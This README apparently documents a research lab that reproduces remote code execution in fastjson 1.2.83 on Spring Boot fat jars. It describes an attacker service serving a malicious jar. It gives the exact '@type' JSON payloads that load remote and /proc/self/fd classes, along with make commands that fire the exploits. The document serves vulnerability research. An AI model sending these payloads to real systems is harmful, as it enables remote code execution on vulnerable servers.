# fastjson Spring Boot fat-jar RCE lab

Self-contained validation lab for fastjson `@JSONType` remote class loading behavior against real Spring Boot executable fat jars:

- JDK 8 direct `jar:http` examples using Spring Boot `2.7.18`:
  - `tomcat`: default embedded Tomcat, exposed on `localhost:18080` and JDWP `5005`.
  - `jetty`: embedded Jetty, exposed on `localhost:18081` and JDWP `5006`.
- JDK 21 FD-reopening-chain probes using Spring Boot `3.2.0`:
  - `tomcat-jdk21-fd`: default embedded Tomcat, exposed on `localhost:28080` and JDWP `6005`.
  - `jetty-jdk21-fd`: embedded Jetty, exposed on `localhost:28081` and JDWP `6006`.
- `attacker`: builds and serves a malicious jar from hostname `attacker:8000` on the compose network.
- `attacker-fd`: builds and serves the modern-JDK FD-chain jar from hostname `attacker-fd:8001`.

The targets are normal Spring Boot fat jars run as `java -jar app.jar`; they do **not** manually instantiate `LaunchedURLClassLoader`. The lab explicitly sets `ParserConfig.defaultClassLoader` to the application classloader so fastjson's resource probe uses the Spring Boot loader.

## Target sink

Each target exposes:

- `POST /parse`: reads the raw request body and calls `JSON.parseObject(body, Dto.class)` where `Dto` is `{ public int x; }`.
- `GET /info`: returns fastjson version, global autoType flag, current thread context classloader, Fastjson `ParserConfig` default classloader, and application classloader.

JDK 8 dependencies: Spring Boot `2.7.18`, Java 8, fastjson `1.2.83`.

JDK 21 FD dependencies: Spring Boot `3.2.0`, Java 21, fastjson `1.2.83`.

## Attacker payload

The attacker service uses ASM to generate a class annotated with `com.alibaba.fastjson.annotation.JSONType` and internal name:

```text
jar:http://attacker:8000/probe!/POC
```

It packages the generated class as `POC.class` inside the jar served at `/probe`. The Spring Boot loader resource lookup for `jar:http://attacker:8000/probe!/POC.class` expects `/probe` to be a jar/zip container and then returns the `POC.class` entry bytes to fastjson's ASM `ClassReader`.

Its static initializer creates `/tmp/PWNED` in the target container and runs `$PWN_CMD`, defaulting to:

```sh
id >> /tmp/PWNED 2>&1; echo RCE_via_fastjson_JSONType >> /tmp/PWNED
```

The exploit scripts send:

```json
{"@type":"jar:http:..attacker:8000.probe!.POC","x":1}
```

## Commands

```sh
make up
make info
make exploit-tomcat
make exploit-jetty
make logs
make down
```

Expected evidence is `/tmp/PWNED` printed from the target container, containing `id` output and `RCE_via_fastjson_JSONType`.

## JDK 21 FD-chain probe

The FD attacker serves `/x`, a jar containing:

- `foo/Exception.class` with internal name `jar:http://attacker-fd:8001/x!/foo/Exception`, annotated with `@JSONType`.
- `fd3/Exception.class` through `fd64/Exception.class`, each annotated with `@JSONType` and internal names like `jar:file:/proc/self/fd/3!/fd3/Exception`.

The exploit scripts generate an array payload beginning with:

```json
{"@type":"jar:http:..attacker-fd:8001.x!.foo.Exception","x":1}
```

followed by FD candidates:

```json
{"@type":"jar:file:.proc.self.fd.N!.fdN.Exception","x":1}
```

Commands:

```sh
make up-fd-jdk21
make info-fd-jdk21
make exploit-fd-tomcat-jdk21
make exploit-fd-jetty-jdk21
```

Expected success evidence is `/tmp/PWNED_FD` in the target container containing `id` output and `RCE_via_fastjson_FD_JSONType`. Failure evidence to inspect: attacker-fd `GET /x`, `/diag` fields for `first.*` and sampled `fdN.*`, target fastjson exceptions, and whether `/proc/self/fd` is readable.
